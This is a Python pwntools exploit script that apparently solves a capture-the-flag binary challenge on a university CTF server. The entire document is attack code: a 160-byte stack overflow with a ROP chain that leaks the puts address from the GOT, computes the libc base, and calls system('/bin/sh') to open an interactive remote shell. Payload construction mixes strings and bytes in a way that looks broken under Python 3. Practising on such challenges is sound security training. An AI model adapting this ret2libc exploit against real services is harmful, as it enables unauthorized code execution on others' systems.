from pwn import *

r = remote('ctf99x.cs.ui.ac.id', 10003)

r.recvuntil('write the following address: ')
address = int(r.recv(10),16)

libc = ELF('./libc-2.27.so')
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b'/bin/sh'))[0]
puts_offset = libc.symbols['puts']


# BINARY FILE
e = ELF('./soal3')
rop = ROP(e)
PUTS = e.plt['puts']
VULN = 0x000005ed
POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0]
PUTS_GOT = 0x00001fd8
payload = 'A'*160 + p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(VULN) 
r.sendline(payload)

# RECV AFTER TRIGGER PUTS
recieved = r.recvline().strip()
leak  = hex(u32(recieved[:4].ljust(4, b'\x00')))
print(leak)
PUT_ADDR = int(leak, 16)
LIBC_BASE = PUT_ADDR - puts_offset

system_address = LIBC_BASE + system_offset
binsh_address = LIBC_BASE + binsh_offset

payload = 'A'*160
payload += p32(system_address)
payload += p32(POP_EBX)
payload += p32(binsh_address)


r.sendline(payload)
r.interactive()
